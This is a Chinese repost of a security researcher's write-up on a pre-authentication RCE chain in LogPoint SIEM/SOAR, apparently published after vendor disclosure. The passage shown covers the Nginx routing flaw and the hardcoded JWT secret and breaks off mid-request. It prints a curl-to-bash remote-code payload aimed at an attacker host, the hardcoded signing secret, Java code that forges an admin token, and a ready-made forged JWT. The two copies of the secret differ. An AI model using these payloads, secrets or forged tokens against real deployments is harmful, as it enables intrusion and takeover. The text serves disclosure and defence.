#  LogPoint SIEM/SOAR 平台预认证RCE漏洞链分析:从路由配置到代码执行的完整攻击路径  
mehmetince  赛博知识驿站   2026-01-09 03:01  
  
   
  
## 要点速览  
  
本文详细展示了针对 LogPoint SIEM/SOAR 平台构建 **pre-auth RCE 漏洞利用链**  
的完整过程,通过链式利用 6 个独立漏洞实现远程代码执行:  
### 核心漏洞链条  
1. 1. **Bug 1 - Nginx 路径路由配置错误**  
:通过在路径前添加 /soar/  
 前缀,可直接访问本应内部调用的 /sso/v1/logpoint/validate-cookie  
 等端点  
  
1. 2. **Bug 2 - 硬编码 JWT 密钥**  
:Java 微服务使用硬编码的 Base64 密钥 WW4wWVRGQVdid0ZsTDhXWFNUQXJDQ0JWVEdzPQ==  
,攻击者可伪造任意 secbi_auth_token  
 JWT 令牌,绕过 SOAR 所有 API 认证  
  
1. 3. **Bug 3 - 内部特权用户凭据泄露**  
:通过伪造的 JWT 访问 /soar/sso/v1/user/auth/apikey  
,可获取内置高权限账户 secbi  
 的 apiKey  
 和 apiSecret  
  
1. 4. **Bug 4 - SSRF 漏洞**  
:/soar/api/v1/soar-sources/config/test/run  
 端点存在 SSRF,通过构造 logpointSiemMachineIp  
 参数可访问宿主机 localhost:18000  
 上的内部 Python API,获取管理员的 secret_key  
,进而调用 /initapp  
 创建有效会话 Cookie  
  
1. 5. **Bug 5 - Python 后端代码执行**  
:告警规则引擎在 _Condition.evaluate()  
 中使用 eval()  
 拼接 trigger_value  
,但该字段未经整数验证即可执行任意 Python 代码  
  
1. 6. **Bug 6 - 静态 AES 密钥绕过验证**  
:告警规则导入功能使用硬编码 AES 密钥 ImmUnEsEcUrIty  
,攻击者可解密 .pak  
 文件,植入恶意 eval()  
 Payload 后重新加密导入,绕过前端整数校验  
  
### 技术架构要点  
- • LogPoint 采用**混合架构**  
:传统 SIEM 组件运行在宿主机 Python 服务,新增 SOAR 功能通过 Docker 容器化 Java 微服务实现  
  
- • 两层 Nginx 代理:外层监听 443 端口,内层在 Docker 容器内监听 localhost:9443  
 分发流量  
  
- • 认证机制割裂:Python 后端使用 Session Cookie,Java 微服务支持 JWT/API Key,服务间通过 HTTP 调用 127.0.0.1:18000/User/preference  
 验证会话  
  
### 利用流程  
```
伪造 JWT → 获取 secbi API Key → SSRF 读取 admin secret_key 
→ 创建管理员 Session → 导入恶意加密告警规则 → 触发规则执行 RCE
```  
### 关键 Payload  
- • **JWT 伪造**  
:使用 io.jsonwebtoken  
 库,设置 token_type=AUTH  
 和 role=SUPER  
  
- • **SSRF 目标**  
:http://127.0.0.1:18000/private/user_access_key  
  
- • **RCE Payload**  
:eval("__import__('os').system('curl ATTACKER_IP:8000 | bash')")  
  
### 披露时间线  
- • 2024/05/30 初次报告 3 个漏洞  
  
- • 2024/07/22 额外报告 8 个严重漏洞  
  
- • 2024/10/03 厂商发布 7.5.0 版本补丁(初次披露后 **229 天**  
)  
  
- • 2025/01/14 公开部分技术细节  
  
- • 计划 2026/01/02 发布完整技术文档  
  
厂商分配 9 个 CVE 编号,CVSS 评分 5.9-7.5(High/Medium),影响全球 1000+ 企业级部署。  
# LogPoint SIEM/SOAR 平台预认证RCE漏洞链分析:从路由配置到代码执行的完整攻击路径  
  
2024年5月,我们的内部安全团队正在评估LogPoint SIEM/SOAR平台,准备用它替换现有系统。作为多年养成的习惯,也是我们第三方尽职调查流程的一部分,我给自己设定了24小时的时间,做我对任何即将信任的技术都会做的事情:尝试攻破它。  
  
这24小时足以让我几乎立即发现**三个严重漏洞**  
。鉴于它们的影响,我就此停止,直接进入负责任披露流程。  
  
几个月后,当我终于有时间回过头来,不是为了寻找更多漏洞,而是为了更好地理解这个系统。第二次审查揭示了更有趣的发现:6个看似独立的小漏洞如何汇聚成一个更大的问题。  
  
本文讲述这个故事。它遵循一个黑客  
研究者的推理过程,在不熟悉的代码、未记录的行为和从未被测试过的假设中导航。过程中包含错误的转折和死胡同,但也有那些微妙感觉不对劲的时刻,仔细检查将这种感觉转化为具体发现。  
  
希望你能像我一样享受这段旅程。祝大家新年快乐!🎊🥳  
  
**核心要点:**  
 本文详细展示了通过链接6个小漏洞构建**预认证RCE利用链**  
的完整过程。我首先映射了设备的请求流(两层Nginx和主机Python服务与基于Docker的Java微服务之间的分离)。从那里开始,利用链逐步形成:暴露的内部路由导致认证原语,硬编码的签名密钥实现伪造访问,泄露的内部API凭据解锁微服务世界中的更高权限,SSRF漏洞到达仅限主机的Python端点以创建管理员会话,最后通过导入警报规则包中的静态AES加密密钥绕过验证,使规则引擎的eval()  
可达。每个部分都展示了证据、推理以及一个弱点如何成为下一个弱点的杠杆,直到最终触发在设备上执行代码。  
## 1. 访问主要软件代码库  
  
这是我预期会很无聊的部分。研究以常规方式开始,使用.iso  
镜像在本地实验室搭建新VM。由于该产品基于Ubuntu构建,操作系统层面没有额外加固,标准的Ubuntu恢复工作流足以重新获得root访问权限并启用SSH,为我提供了一个稳定的分析环境。  
  
获得访问权限后,我开始分析代码。主Web应用程序用Python编写,基于定制的Flask框架,位于:  
```
/opt/makalu/installed/webserver/
```  
  
这不是一个完全透明的代码库。像许多生产设备一样,大部分Python逻辑仅以编译的.pyc  
文件形式交付。为了方便工作,我将相关目录复制到本地,并使用uncompyle6  
反编译孤立的字节码来重建缺失的源代码。  
  
这些都是相当标准的逆向工程工作,所以我省略细节。  
```
#!/bin/bash# 遍历目录并检查.pyc文件的函数check_pyc_files() { # 使用find定位所有.pyc文件
 find . -type f -name "*.pyc" | while read pyc_file; do   # 移除.pyc扩展名并替换为.py以查找对应的.py文件
   py_file="${pyc_file%.pyc}.py"   # 检查对应的.py文件是否存在   if [[ ! -f "$py_file" ]]; then     # 如果不存在,打印.pyc文件名     echo "No matching .py file for: $pyc_file"
     uncompyle6 $pyc_file > $py_file   fi done
}# 从当前目录开始调用函数检查
check_pyc_files
```  
  
我以为这就是快速进行手动源代码分析所需的全部。但很明显,LogPoint比我最初假设的要复杂得多。我以为这只是快速的表面审查,结果变成了更深入的研究,我意识到自己只是触及了表面。  
## 2. 当传统遇见容器!理解技术架构概览  
  
在操作系统和代码库上花了几个小时后,产品的历史开始显现。一些设计选择最初感觉很奇怪,但一旦我理解了产品随时间的演变,就开始有意义了。  
  
LogPoint显然是作为**SIEM优先**  
平台设计的。架构反映了那个时代:核心服务如Python后端、日志规范化器和数据库组件直接运行在主机操作系统上,这种设计远早于Docker和现代容器编排成为规范。  
  
随着市场向自动化响应转变,LogPoint需要演进。这种演进采用了SOAR的形式,这是一种无法轻易适应原始架构的新功能。他们没有重写所有内容,而是使用Docker引入了较新的SOAR组件。一旦启用SOAR,容器化服务就会与传统的基于主机的服务一起启动,标志着产品过去和现在之间的明确界限。  
> **SIEM**  
关注可见性——收集和关联安全事件以告诉你  
发生了什么  
。**SOAR**  
关注行动——自动化响应,使接下来真正发生某些事情。  
如果SIEM是拉响警报的系统,SOAR就是拉动杠杆的系统。  
  
  
下图反映了我对技术架构的高层理解。SOAR组件作为Docker容器运行,配置了桥接网络接口,与长期存在的主机级服务并存。  
  
![LogPoint架构](https://mmbiz.qpic.cn/mmbiz_jpg/MuPQsYZPics6bkfALyCYbUKVagZQ5p5tPBVK1jEMTTTZgcEqvDSNSW8T1qPdy88kaFTwoyqwTQsPaX9243Nicibhg/640?wx_fmt=jpeg&from=appmsg "null")  
  
LogPoint架构  
  
在不进行重大工程投资的情况下,几乎不可能将现有服务和核心软件迁移到Docker实例。因此他们放宽了Docker网络加固,允许所有进程相互通信。  
  
还有一个细节值得注意。所有这些SOAR微服务都用Java实现,并在容器网络内运行。这意味着演进不仅是架构上的,也是技术上的,从原始的基于Python的技术栈明确转向Java技术。仅这一变化就引发了关于一致性、假设和信任边界的几个问题,我稍后会回到这些问题。  
### 2.1 追踪外部攻击向量  
  
最终目标很简单:预认证远程代码执行。在与安全产品打交道和攻破它们的二十多年里,我了解到理解设计通常是构建可靠攻击向量的最有效方法。一旦架构清晰,你深入兔子洞越深,遇到的意外就越少,推理事情可能失败的地方就越容易。  
  
下图是我在研究期间理解的内容。由于默认的iptables  
规则:我们只能访问默认启用的80和443端口。  
  
![LogPoint数据流网络概览](https://mmbiz.qpic.cn/mmbiz_jpg/MuPQsYZPics6bkfALyCYbUKVagZQ5p5tPgJicnGH1S5KjjfV9bgsiaQKw01ictWJ0NL0GC8TJVXz32HxN7ibEACfRXQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
LogPoint数据流网络概览  
  
这意味着有两个Nginx  
实例需要关注。为了确定从外部可以访问什么,我直接查看它们的配置。  
  
第一个Nginx实例位于设备边缘,处理443端口上的所有传入请求。第二个在容器化环境内运行,将流量路由到SOAR微服务。任何外部请求必须通过外部Nginx才能到达容器层,这使得两者之间的边界从安全角度来看特别有趣。  
### 2.2 两个Nginx实例的故事  
  
让我们看看第一个NGINX配置。你可以在/opt/makalu/installed/webserver/deploy/nginx.conf  
找到配置文件  
```
location /soar/ {    set $session_cookie $http_cookie;    add_header logpoint-cookie $session_cookie;    proxy_pass https://localhost:9443/soar/;
}# ... 省略配置 ...location /soar/sso/ {    proxy_pass_request_headers on;    proxy_pass https://localhost:9443/sso/;
}location /soar/elastic/ {    proxy_pass https://localhost:9443/elastic/;
}location ~ ^/soar/(backend|data|reports-service|multi-tenant) {    rewrite ^/soar/(.*)$ /$1 break;    proxy_pass https://localhost:9443/$1;
}location /soar/api/ {    proxy_pass_request_headers on;    proxy_send_timeout 600;    proxy_read_timeout 600;    send_timeout 600;    proxy_pass https://localhost:9443/api/;
}
```  
  
乍一看,它主要充当反向代理,将选定的URL路径转发到监听localhost:9443  
的内部服务。大多数SOAR相关端点以及静态资源和运行时资源都以最小转换传递。  
```
root@logpoint:~# docker ps |grep front
9345cf9e5e7d   secbi/frontend-v3:v2.1.0   "/docker-entrypoint…"   2 weeks ago   Up 42 minutes   soar-frontend

root@logpoint:~# docker exec -it 9345cf9e5e7d bash
bash-5.1# cat /etc/nginx/nginx.conf |grep 9443
    listen 9443 ssl http2;
    listen [::]:9443 ssl http2;
```  
  
简单列出Docker并访问secbi/frontend  
实例帮助我验证请求被发送到监听localhost:9443  
的第二个Nginx。  
  
现在,让我们看看第二个NGINX配置。由于配置文件很长,我只grep了最重要的行。这会让你大致了解发生了什么。  
```
location / {    location /soar/ {
    }    location /soar/images {
    }    location /mssp {        proxy_pass http://soar-mssp-service:9070;
    }    location /schedule {        proxy_pass http://secbi-scheduler-service:9861;
    }    location /notifications {        proxy_pass http://soar-notifications-service:8111;
    }    location /api {        proxy_pass http://secbi-api-service:8787;
    }    location /data {        proxy_pass http://secbi-data-service:9987;
    }    location /backend {        proxy_pass http://secbi-backend-service:9088;
    }    location /elastic {        proxy_pass http://elastic:9200/;
    }    location /sso {        proxy_pass http://secbi-login-service:8072;
    }
}
```  
  
与外部代理不同,这个代理充当多个SOAR微服务之间的流量调度器。每个路径直接映射到特定的后端——服务  
、调度器  
、通知引擎  
、API层  
,甚至Elasticsearch  
本身。  
  
这里突出的是Nginx路径配置的宽松程度。宽泛的路由规则使得仅通过URL路径就能轻松到达内部服务。此时,Nginx不再强制执行安全边界;它只是路由流量,通常匹配路径就足以让请求被信任并转发。  
## 漏洞1 – Nginx路径路由配置错误  
  
通常,这种设计有风险但不危险。它假设其背后的每个端点都正确执行身份验证和授权。当中央会话机制是JWT  
时,这种方法通常效果很好。用户提供令牌;代理转发它,每个服务独立验证身份和权限。  
(顺便说一句,API网关是更好的方法)  
  
但这就是攻击者思维开始发挥作用的地方。像这样的路由层极大地扩展了攻击面。我不再看单个应用程序。我在看一组内部服务,每个都有自己的端点、假设和边缘情况。我只需要在某个地方犯一个错误就能开始拉线。  
  
这种认识让我回到自研究开始以来一直在思考的问题。传统Python后端和一组现代Java微服务实际上如何协同工作!?  
> **Python后端的认证如何在SOAR世界(docker服务)中共享/验证?**  
  
  
最重要的任务是回答这些问题。所以我开始进行简单的测试。首先,我知道这些容器可以通过HTTP相互通信。无论如何这是内部通信。我还知道Docker处于桥接模式,这为我提供了一种相当简单的方法来获得Docker到Docker通信之间的更多可见性。  
```
root@logpoint:~# tcpdump -i lo -vvv -s 0 -A 'tcp[((tcp[12:] & 0xf0) >> 2):4] = 0x47455420 or tcp[((tcp[12:] & 0xf0) >> 2):4] = 0x504f5354'

tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes

08:58:40.776227 IP (tos 0x0, ttl 64, id 52811, offset 0, flags [DF], proto TCP (6), length 210)
    localhost.37562 > localhost.8072: Flags [P.], cksum 0xfec6 (incorrect -> 0xcda9), seq 1525306448:1525306618, ack 1891361062, win 22, length 170
E..k.@.@..2.TPp8....
.....GET /sso/v1/health HTTP/1.1
Host: soar-login-service:8072
User-Agent: Consul Health Check
Accept: text/plain, text/*, */*
Accept-Encoding: gzip
Connection: close
```  
  
在本地接口上运行的简单tcpdump  
足以显示每个内部HTTP请求。终端几乎立即开始充斥流量。  
  
我使用管理员用户登录产品,进入设置 > SOAR设置页面。我查看Burp Suite日志,看到大量请求。当我瞥了一眼运行tcpdump的终端时,所有地狱都爆发了。内部流量的量远高于仅UI交互所暗示的。  
  
我开始阅读Burp Suite日志,精选了https://192.168.179.136/soar/api/v1/session/username  
请求。重置终端并清除所有输出后,我使用**CTRL + R**  
将请求发送到Repeater,并通过单击**Repeat**  
按钮触发一次。  
  
当你重复该请求时,你可以立即在tcpdump  
输出中看到2个不同的HTTP请求出现。  
```
root@logpoint:~ tcpdump -i lo -vvv -s 0 -A 'tcp[((tcp[12:] & 0xf0) >> 2):4] = 0x47455420 or tcp[((tcp[12:] & 0xf0) >> 2):4] = 0x504f5354'

GET /api/v1/session/username HTTP/1.0
Host: localhost:9443
cookie: session=96ba21e449fc4a28_66714edb.VBehj2LxPrac_AFhtZZarjLdDqk

POST /sso/v1/logpoint/validate-cookie HTTP/1.1
Content-Type: application/json
Host: secbi-login-service:8072
User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.8.1)

{"key":"session","value":"96ba21e449fc4a28_66714edb.VBehj2LxPrac_AFhtZZarjLdDqk"}
```  
  
这两个请求回答了我的问题。第一个请求GET /api/v1/session/username  
是我直接触发的。第二个请求POST /sso/v1/logpoint/validate-cookie  
是由微服务本身在幕后生成的!让我解释发生了什么。  
1. 1. 从外部世界,我向/soar/api/v1/session/username  
发送请求。由于第一个NGINX规则,它被发送到https://localhost:9443/api/  
  
1. 2. 遵循第二个NGINX规则,它启动并将其转发到api-service  
容器  
  
1. 3. Api服务从请求中获取会话cookie,并向POST /sso/v1/logpoint/validate-cookie  
端点发送全新的HTTP POST调用以验证会话!  
  
1. 4. 这个端点也来自api-service  
容器。不知何故,这个函数验证了我们的会话。但是,说真的...它是如何做到的?  
  
但在跟随白兔并反编译Java微服务之前,我暂停并专注于漏洞本身。/sso/v1/logpoint/validate-cookie  
端点立即突出。这个端点显然不是公开访问的。然而,从攻击者的角度来看,我可以通过在路径中添加/soar/  
前缀直接访问它。  
  
那一刻很难忽视。没有认证技巧,还没有绕过逻辑。只是一个简单的路径重写,悄悄地将内部端点变成暴露给外部世界的东西。  
  
![访问内部API](https://mmbiz.qpic.cn/mmbiz_jpg/MuPQsYZPics6bkfALyCYbUKVagZQ5p5tPd2wo9bibTC0g7rD7K4lwgJ72ZW2PeSYiabsP3qDaznwQIiaJricKea6Gxw/640?wx_fmt=jpeg&from=appmsg "null")  
  
访问内部API  
## 一个 Cookie,多次跳转:SOAR 认证管道映射  
  
现在是时候深入探究了。要真正理解正在发生的事情,我需要查看微服务内部。是否还有其他隐藏的端点?Cookie 验证在幕后究竟是如何工作的?  
  
我从每个 Docker 镜像中复制了所有 JAR 文件,并将它们提取到一个文件夹中以便跟踪执行流程。(简单技巧组合命令:docker ps  
、grep  
、docker cp  
、procyon-decompiler  
)  
  
login-service  
: com/secbi/login/generated/api/logpoint/LogpointApi.java  
 包含以下代码段,对应我们在第二个请求中看到的 API 端点。  
```
@RequestMapping(    value = "/logpoint/validate-cookie",    produces = { "application/json" },    method = RequestMethod.POST)default ResponseEntity<ValidateCookieResponse> validateCookie(    @ApiParam(value = "cookie as String", required = true)    @Valid @RequestBody final Cookie cookie) {    try {        return ResponseEntity.ok(
            authService.validateCookie(cookie.getValue())
        );
    }    catch (Exception e) {
        LogpointApi.log.error("Cookie validation failed", e);        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).build();
    }
}
```  
  
上述代码在 try-catch  
 块中调用 validateCookie()  
,这意味着我们需要继续深入这些方法定义并理解执行流程。  
```
public ResponseEntity<ValidateCookieResponse> validateCookie(        @ApiParam(value = "cookie", required = true)        @Valid @RequestBody final Cookie cookie) {
    ValidateCookieResponse validateCookieResponse;    try {
        validateCookieResponse =            this.logpointAuthorizationManager.validateCookie(cookie);
    }    catch (final SecBiException e) {        throw new CustomException(
            ErrorsEnum.GENERIC_500.getId(),
            (Throwable) e
        );
    }    return (ResponseEntity<ValidateCookieResponse>)        new ResponseEntity(
            (Object) validateCookieResponse,
            HttpStatus.OK
        );
}
```  
  
第 9 行调用了 logpointAuthorizationManager  
 的 validateCookie()  
 方法。继续跟踪调用链。  
```
public ValidateCookieResponse validateCookie(final Cookie cookie) throws SecBiException {    this.validateCookieStructure(cookie);    final String cookieValue = cookie.getValue();    final ActiveCookieValidationResult activeResult = this.cookieValidator.validateActive(cookie);    if (!activeResult.isActive()) {        this.removeLocalSession(cookie);
        LogpointAuthorizationManager.logger.info(
            String.format("verifyCookieStatus for cookie %s returns:INVALID_COOKIE", cookieValue)
        );        return new ValidateCookieResponse()
            .cookieStatus(CookieStatus.INVALID_COOKIE.name());
    }    final LocalSessionDetails localSession = this.localSessionsStorage.fetchByCookieValue(cookieValue);    if (localSession != null) {        this.localSessionsStorage.updateLastActiveTimestampMillis(
            cookieValue,
            System.currentTimeMillis()
        );

        LogpointAuthorizationManager.logger.info(
            String.format(                "verifyCookieStatus for cookie %s returns:VALID_COOKIE_WITH_LOCAL_SESSION",
                cookieValue
            )
        );        return new ValidateCookieResponse()
            .cookieStatus(CookieStatus.VALID_COOKIE_WITH_LOCAL_SESSION.name())
            .user(activeResult.getUser());
    }   // ... 省略代码 ...
}
```  
  
这里有两个重要的函数调用:  
- • 第 18 行:fetchByCookieValue()  
 接收 cookie  
 值本身  
  
- • 第 7 行:validateActive()  
 接收 cookie  
 对象本身  
  
如果你还记得几节前 Burp Suite 截图中的 HTTP 响应,同样的错误代码出现在这里:VALID_COOKIE_WITH_LOCAL_SESSION  
,现在就在源代码的第 28 行。这立即缩小了焦点范围。在其他任何事情之前,我需要理解第 18 行发生了什么:fetchByCookieValue()  
 调用。  
```
public LocalSessionDetails fetchByCookieValue(final String cookieValue) {    if (StringUtils.isBlank((CharSequence) cookieValue)) {        return null;
    }    final Document cookieValueQuery =        new Document("cookie.value", (Object) new Document("$eq", (Object) cookieValue));    final FindIterable<LocalSessionDetails> localSessionDetails =
        (FindIterable<LocalSessionDetails>) this.localSessionsColl.find((Bson) cookieValueQuery);    if (localSessionDetails == null) {        return null;
    }    return (LocalSessionDetails) localSessionDetails.first();
}
```  
  
这个函数完全按照其名称所示执行。它查询 MongoDB  
 并验证会话。仅此而已。没有奇怪的逻辑,没有可疑的捷径,乍一看没有任何可利用的东西。  
  
但随后第 7 行重新引起关注。validateActive()  
 不验证令牌或字符串,它接收 cookie  
 对象本身。虽然到目前为止 Java 实现看起来很可靠,但经验告诉我一件事:即使一切看起来都正确,这正是你需要继续阅读的时候。你永远不知道会发现什么。  
```
public ActiveCookieValidationResult validateActive(final Cookie cookie) {    final LogPointUser user =
        (LogPointUser) this.logpointCookiesCache.get(cookie);    if (user != null) {        return new ActiveCookieValidationResult()
            .active(true)
            .user(user);
    }    final ActiveCookieValidationResult activeCookieValidationResult = this.externalValidation(cookie);    // ... 省略代码 ...    return activeCookieValidationResult;
}
```  
  
这有点意思。方法的命名开始看起来更有希望了。现在我们要查看 externalValidation()  
```
public ActiveCookieValidationResult externalValidation(final Cookie cookie) {    if (this.loginConfig.isCookieValidationUseNewApi()) {        return this.externalValidationNewApi(cookie);
    }    return this.externalValidationOldApi(cookie);
}
```  
  
externalValidation()  
 函数看起来非常简单。它检查 isCookieValidationUseNewApi()  
,该方法只是通过基本的 setter  
 和 getter  
 返回一个值。  
```
private ActiveCookieValidationResult externalValidationNewApi(final Cookie cookie) {

    UserInfoByCookieApiResponse userInfoByCookieApiResponse;    try {
        userInfoByCookieApiResponse =
            LogPointUtils.fetchUserInfoByCookie(                this.loginConfig.getLogpointServer(),
                (int) Integer.valueOf(this.loginConfig.getLogpointPrivateApiPort()),
                cookie
            );
    }    catch (final SecBiException e) {        throw new CustomException(
            ErrorsEnum.LOGPOINT_COOKIE_VALIDATION_ERROR.getId(),
            (Throwable) e
        );
    }
}
```  
  
最终,RestClient  
 出现了。这是缺失的环节。我在请求中放置的 cookie  
 流经所有这些函数,最终被交给 RestClient  
 以针对另一个端点进行验证。理论上,该端点属于运行在主机上的旧版 Python 后端。  
  
请耐心等待,我们快到了。在结束这次探索之前的最后一站是 fetchUserInfoByCookie()  
```
public static UserInfoByCookieApiResponse fetchUserInfoByCookie(        String logpointServer,        int logpointPrivateApiPort,        String logpointPrivateApiSchema,        Cookie cookie) {    LogPointRestClientImpl logPointRestClient = null;
    UserInfoByCookieApiResponse result;    try {
        logPointRestClient =            new LogPointRestClientImpl(
                logpointServer,
                String.valueOf(logpointPrivateApiPort),
                logpointPrivateApiSchema,
                restClientConfig
            );

        result = logPointRestClient.fetchUserInfoByCookie(cookie);
    }    finally {
        IOUtils.closeQuietly(logPointRestClient);
    }    return result;
}
```  
  
最终,RestClient  
 出现在视野中。我在请求中包含的 cookie  
 流经所有这些函数,最终被交给 RestClient  
 以针对另一个端点进行验证。理论上,该端点属于运行在主机上的旧版 Python 后端!  
  
让我们回顾一下我们一直在跟踪的调用链。  
```
Burp Suite
 → GET /api/v1/session/username
   → 前端 NGINX
     → login-service
       → validateCookie(控制器)
         → logpointAuthorizationManager.validateCookie
           → cookieValidator.validateActive
             → 缓存查找
             → externalValidation
               → externalValidationNewApi
                 → LogPointUtils.fetchUserInfoByCookie
                   → LogPointRestClientImpl.fetchUserInfoByCookie   <-- 我们在这里
           → Mongo localSessionsStorage.fetchByCookieValue
```  
  
为了证明我们可以一路到达那里,我将 cookie  
 值更改为不存在的值。因此,我们将能够避免此服务的内部缓存,并一直到达 fetchUserInfoByCookie()  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MuPQsYZPics6bkfALyCYbUKVagZQ5p5tPMmftsEhhcKYDdNwqgvQ0O8Y2KD6IUo7UMT5gKZU74kBLGsH9zgEicEw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
预期返回错误,但真正让我震惊的是终端上的信息。我查看 secbi/login-service  
 容器日志,看到了这条消息。  
```
2024-06-18 10:09:37.882 INFO  [nio-8072-exec-7]c.s.r.c.e.l.LogPointRestClientImpl
fetching user information by cookie...

2024-06-18 10:09:37.882 INFO  [nio-8072-exec-7]c.s.r.c.e.l.LogPointRestClientImpl
LOGPOINT API call:
Method: GET
URL: http://127.0.0.1:18000/User/preference
cookie: class Cookie {
  key: session
  value: INVALIDCOOKIE
}
```  
  
我记得这个端点来自 Python 后端代码分析。当时,它的用途并不清楚。现在终于说得通了。我在这条路上学到的一切都在这里连接起来,稍后会很重要。  
  
最初的问题得到了解答,但它给我留下了比开始时更多的问题。这通常是一个好兆头。  
### 一个答案引发多个问题  
  
我们现在了解了 secbi/login-service  
 端点 /soar/api/v1/session/username  
 的内部工作原理。但它不是结束循环,而是引发了更多问题:  
- • 为什么存在一个仅返回用户名的 API?  
  
- • 其他 Docker 服务如 secbi/backend-service  
、secbi/api-service  
 或 secbi/workflows  
 呢?  
  
- • 对这些服务的每个请求是否都会触发对 secbi/login-service  
 的另一次内部调用,然后再次调用 127.0.0.1:18000/User/preference  
?  
  
- • 在这种规模的 SOAR 平台中,授权实际上在哪里发生?  
  
- • 为什么不在 secbi/*  
 微服务之间使用共享的 JWT 模型,而不是链接内部 HTTP 请求?  
  
此时,这种设计开始感觉不像是优化,更像是值得质疑的假设。  
## 漏洞 2:硬编码的 JWT SECRET 和所有 SOAR API 的认证绕过  
  
对 Java 服务和旧版 Python 后端之间的会话验证工作原理有了更清晰的理解后,一个问题一直困扰着我。用户发起的请求可能遵循这个 HTTP 调用链,但服务到服务的请求是如何认证的?工作流、调度器、定时任务都在没有用户的情况下运行。必须有某种机制。  
  
此时,熟悉的凌晨 4 点的感觉开始出现。太多问题,答案不够。我离开,睡了几个小时,几小时后带着更清醒的头脑回来。这次,我提醒自己为什么喜欢这种工作。阅读别人的代码,理解他们的决定,并遵循他们铺设的路径是一半的乐趣。所以我停止堆积问题,而是做最简单的事情。我回到代码并继续阅读。  
  
几分钟之内,我实际上偶然发现了以下控制器方法。这里没有我们可以利用的东西,但 secbi_auth_token  
 的 RequestHeader  
 注解是什么,它甚至默认不是必需的??  
```
@RequestMapping(    value = "/user/auth/apikey",    produces = {"application/json"},    method = RequestMethod.GET)default ResponseEntity<List<ApiCredentials>> getAllApiCredentialsByToken(    @ApiParam("The authentication token as generated upon login")    @RequestHeader(value = "secbi_auth_token", required = false)    final String secbiAuthToken) {    if (this.getObjectMapper().isPresent() && this.getAcceptHeader().isPresent()) {        if (!this.getAcceptHeader().get().contains("application/json")) {            return (ResponseEntity<List<ApiCredentials>>)                new ResponseEntity(HttpStatus.NOT_IMPLEMENTED);
        }        try {           // ... 省略代码 ...
        }        catch (final IOException e) {            // ... 省略代码 ...;
        }
    }    // ... 省略代码 ...
}
```  
  
几分钟后,事情终于明朗了。答案已经在代码中了。在内部,微服务支持每个用户的 API 密钥机制。它默认未启用,至少现在还没有,但管道显然存在。  
  
深入挖掘后,我直接找到了我正在寻找的文件:JWTLoginAuthorizationManager.java  
。这就是这项研究停止感觉学术性的地方!我实际上开始觉得我可能真的有可以滥用的东西!  
  
此类使用硬编码密钥处理 JWT 验证,不仅负责验证令牌,还负责返回相关权限。服务到服务的认证故事突然变得更有意义了。  
```
public class JWTLoginAuthorizationManager        extends AbstractLoginAuthorizationManager {    private static final String JWT_ENCODED_SECRET = "WW4wWVRGQVdid0ZsTDhXWFNUQXJDQ0JWVEdzPQ==";    private static final String CLAIM_USERNAME = "username";    private static final String CLAIM_TOKEN_TYPE = "token_type";    private static final String CLAIM_ROLE = "role";    private boolean tokenExpirationEnabled;    private int expirationMins;    public JWTLoginAuthorizationManager(            final boolean tokenExpirationEnabled,            final int expirationMins    ) {        this.tokenExpirationEnabled = tokenExpirationEnabled;        this.expirationMins = expirationMins;
    }    public void init(final Properties properties) {        super.init(properties);
    }    public IUser verifyUserAuthToken(final String authToken) {
        IUser user;        try {            if (StringUtils.isBlank((CharSequence) authToken)) {                throw new CustomException(
                    ErrorsEnum.INVALID_AUTH_TOKEN.getId()
                );
            }            final Claims claims = this.getTokenClaims(authToken);            final TokenType tokenType =
                TokenType.getByType(
                    claims.get((Object) "token_type").toString()
                );            if (!TokenType.AUTH.equals((Object) tokenType)) {                throw new CustomException(
                    ErrorsEnum.INVALID_TOKEN_TYPE.getId()
                );
            }

            user = (IUser) new User();
            user.setUsername(
                claims.get((Object) "username").toString()
            );
            user.setRole(
                UserRole.valueOf(
                    claims.get((Object) "role").toString()
                ).getRole()
            );
            user.setTokenStrategy(TokenStrategy.JWT.name());
        }        catch (Exception e) {            throw e;
        }        return user;
    }
}
```  
  
该类验证 secbi_auth_token  
 JWT,从令牌声明中派生用户身份和角色。第一个关键的、可直接利用的问题是签名密钥被硬编码为静态常量。我可以使用 token_type=AUTH  
 和任意的 username  
 和 role  
 声明来铸造自己的有效 JWT,然后访问 Java 微服务世界中依赖 secbi_auth_token  
 头的任何端点!!!  
### 伪造有效的 JWT 令牌  
  
我在开始时将所有必需的 jar 文件从 Logpoint 实例复制到本地。我使用它们构建以下代码来伪造有效的 JWT 令牌。  
```
import io.jsonwebtoken.Jwts;import io.jsonwebtoken.SignatureAlgorithm;import io.jsonwebtoken.impl.TextCodec;import io.jsonwebtoken.JwtBuilder;import io.jsonwebtoken.Claims;import io.jsonwebtoken.ExpiredJwtException;import io.jsonwebtoken.MalformedJwtException;import io.jsonwebtoken.SignatureException;import java.util.Date;public class Main {    public static void main(String[] args) {
        System.out.println("Hello world!");        final JwtBuilder jwtBuilder = Jwts.builder().setSubject("admin")
                .claim("username", (Object) "admin")
                .claim("role", (Object) "SUPER")
                .claim("token_type", (Object) "AUTH").
                setIssuedAt(new Date(System.currentTimeMillis())).signWith(SignatureAlgorithm.HS256, TextCodec.BASE64.decode("WW4wbWRGQVdjd0ZsTDhXWFNUQXJDQ0JvVEdzPQ=="));
        System.out.println(jwtBuilder.compact());
    }
}
```  
  
注意,所有 Logpoint 实例上默认创建一个 "admin" 用户名。构建并运行上述代码后,你将获得以下魔法令牌。  
  
**魔法 JWT 令牌:**eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiU1VQRVIiLCJ0b2tlbl90eXBlIjoiQVVUSCIsImlhdCI6MTcxODcwNzI4OH0.EBgc_BGubwbLH-91M4rFnd0BguvTAJHod1YObw5fqJc  
  
我访问 /soar/sso/v1/user/auth/apikey  
 端点。再一次,目标是从外部网络访问它。为此,我只需在路径前添加 /soar/sso  
,这会告诉第一个 Nginx 实例将请求直接路由到登录微服务。  
```
// 从外部世界向第一个 NGINX 发送的 HTTP 请求GET /soar/sso/v1/user/auth/apikey HTTP/2Host: 192.168.179.136
